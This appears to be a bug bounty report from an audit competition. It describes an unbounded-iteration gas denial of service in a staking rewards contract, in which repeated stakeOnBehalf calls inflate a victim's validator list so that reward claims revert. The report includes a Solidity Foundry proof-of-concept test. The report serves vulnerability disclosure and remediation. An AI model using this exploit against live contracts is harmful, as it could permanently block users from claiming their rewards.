# 51369 sc high unbounded iteration gas dos in validatetokenforclaim&#x20;

**Submitted on Aug 2nd 2025 at 05:01:22 UTC by @BeastBoy for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* **Report ID:** #51369
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-plume-network/blob/main/plume/src/facets/RewardsFacet.sol>
* **Impacts:**
  * Protocol insolvency
  * Permanent freezing of funds

## Description

When a reward token is inactive, `_validateTokenForClaim` reads the victim’s entire `userValidators` array and for each entry executes `calculateRewardsWithCheckpointsView`, which itself walks through every reward‑rate and commission checkpoint.

Because `stakeOnBehalf(...)` is public and uncapped, an attacker can call it repeatedly to append thousands of distinct validator IDs for any user. Once the token is delisted, every `claim` invocation on that token by the victim triggers the nested loops. The combined O(V×C) gas cost where V is the number of validators and C the number of checkpoints per validator quickly exceeds block gas limits, causing the claim to revert permanently.

## Impact

Attacker can permanently prevent any user from withdrawing rewards for a removed token by forcing every claim to run out of gas.

## Recommendation

Maintain each user’s validator set with an enumerable mapping to forbid duplicate entries and enforce a reasonable maximum size, or require explicit approval before `stakeOnBehalf` can add a validator and include a safeguard in `_validateTokenForClaim` that reverts early if the validator count exceeds a safe iteration threshold.

## Proof of Concept

{% stepper %}
{% step %}

### Setup victim and environment

The test demonstrates creating many validators and inflating a victim's validator array so that subsequent claim calls become too expensive and revert.

Key actions in this step:

* Prepare a victim account and admin context.
* Create many additional validators for the attack.
  {% endstep %}

{% step %}

### Inflate victim's validator array

The attacker uses `stakeOnBehalf` repeatedly to associate the victim with many validators (minimal stake each time), producing a very large `userValidators` array for the victim.
{% endstep %}

{% step %}

### Remove the reward token

Remove (delist) the reward token to ensure `_validateTokenForClaim` executes the expensive validation path that iterates over the victim's validators and checkpoints.
{% endstep %}

{% step %}

### Victim attempts to claim — expected revert due to gas exhaustion

When the victim calls `claim(PLUME_NATIVE)` (or `claimAll()`), the nested loops O(V×C) cause the call to run out of gas and revert, confirming the gas DoS.
{% endstep %}

{% step %}

### Confirm all claim functions affected

The test demonstrates that `claimAll()` also fails, showing that all claim paths that trigger `_validateTokenForClaim` are blocked.
{% endstep %}
{% endstepper %}

Full PoC test used to reproduce:

{% code title="ProofOfConcept.sol" %}

```solidity
/**
 * @notice Test to demonstrate the gas DoS vulnerability in _validateTokenForClaim
 * @dev This test shows how an attacker can inflate a victim's validator array
 *      and cause claim functions to run out of gas
 */
function testGasDoSVulnerability() public {
    console2.log("=== Testing Gas DoS Vulnerability ===");
    
    // Setup victim
    address victim = address(0x1337BEEF);
    vm.deal(victim, 10 ether);
    
    vm.startPrank(admin);
    
    // Step 1: Create many additional validators for the attack
    uint256 attackValidators = 500; // Should be enough to cause gas issues
    console2.log("Creating %d attack validators...", attackValidators);
    
    for (uint16 i = NUM_VALIDATORS; i < NUM_VALIDATORS + attackValidators; i++) {
        address valAdmin = vm.addr(uint256(keccak256(abi.encodePacked("attackValidator", i))));
        vm.deal(valAdmin, 1 ether);
        
        ValidatorFacet(address(diamondProxy)).addValidator(
            i,
            VALIDATOR_COMMISSION,
            valAdmin,
            valAdmin,
            string(abi.encodePacked("l1val", i)),
            string(abi.encodePacked("l1acc", i)),
            vm.addr(uint256(keccak256(abi.encodePacked("l1evm", i)))),
            1_000_000_000 ether // High capacity
        );
    }
    
    // Step 2: Inflate victim's validator array using stakeOnBehalf
    console2.log("Inflating victim's validator array...");
    StakingFacet stakingFacet = StakingFacet(address(diamondProxy));
    
    // Add victim to many validators with minimal stake (1 wei each)
    for (uint16 i = 0; i < NUM_VALIDATORS + attackValidators; i++) {
        stakingFacet.stakeOnBehalf{value: 1 wei}(victim, i);
    }
    
    // Verify the array is inflated
    uint16[] memory victimValidators = ValidatorFacet(address(diamondProxy)).getUserValidators(victim);
    console2.log("Victim now associated with %d validators", victimValidators.length);
    
    // Step 3: Remove the reward token to trigger the expensive validation loop
    console2.log("Removing reward token to trigger validation loop...");
    RewardsFacet(address(diamondProxy)).removeRewardToken(PLUME_NATIVE);
    
    vm.stopPrank();
    
    // Step 4: Attempt to claim as victim - this should fail due to gas exhaustion
    console2.log("Victim attempting to claim rewards...");
    vm.startPrank(victim);
    
    uint256 gasBefore = gasleft();
    console2.log("Gas available before claim: %d", gasBefore);
    
    // This should revert due to out of gas when _validateTokenForClaim loops through all validators
    try RewardsFacet(address(diamondProxy)).claim(PLUME_NATIVE) {
        uint256 gasAfter = gasleft();
        uint256 gasUsed = gasBefore - gasAfter;
        console2.log("❌ UNEXPECTED: Claim succeeded, gas used: %d", gasUsed);
        
        // If it somehow succeeds, log the gas usage
        if (gasUsed > 20_000_000) { // Very high gas usage indicates the vulnerability
            console2.log("⚠️  VULNERABILITY CONFIRMED: Extremely high gas usage detected");
        }
    } catch Error(string memory reason) {
        uint256 gasAfter = gasleft();
        uint256 gasUsed = gasBefore - gasAfter;
        console2.log("✅ VULNERABILITY CONFIRMED: Claim reverted with: %s", reason);
        console2.log("Gas used before revert: %d", gasUsed);
        
        // Check if it's an out of gas error or similar
        if (keccak256(bytes(reason)) == keccak256(bytes("out of gas")) || 
            keccak256(bytes(reason)) == keccak256(bytes("")) ||
            gasUsed > 10_000_000) {
            console2.log("🚨 CRITICAL: Gas DoS attack successful - victim cannot claim rewards");
        }
    } catch (bytes memory) {
        uint256 gasAfter = gasleft();
        uint256 gasUsed = gasBefore - gasAfter;
        console2.log("✅ VULNERABILITY CONFIRMED: Claim reverted with low-level error");
        console2.log("Gas used before revert: %d", gasUsed);
        console2.log("🚨 CRITICAL: Gas DoS attack successful - victim cannot claim rewards");
    }
    
    vm.stopPrank();
    
    // Step 5: Demonstrate that this affects ALL claim functions
    console2.log("Testing claimAll function...");
    vm.startPrank(victim);
    
    gasBefore = gasleft();
    try RewardsFacet(address(diamondProxy)).claimAll() {
        uint256 gasAfter = gasleft();
        uint256 gasUsed = gasBefore - gasAfter;
        console2.log("❌ UNEXPECTED: ClaimAll succeeded, gas used: %d", gasUsed);
    } catch {
        uint256 gasAfter = gasleft();
        uint256 gasUsed = gasBefore - gasAfter;
        console2.log("✅ ClaimAll also fails - gas used: %d", gasUsed);
        console2.log("💀 ALL CLAIM FUNCTIONS BLOCKED - FUNDS PERMANENTLY LOCKED");
    }
    
    vm.stopPrank();
    
    console2.log("=== Gas DoS Vulnerability Test Complete ===");
    console2.log("🚨 RESULT: Victim's funds are permanently locked due to unbounded iteration");
}
```

{% endcode %}
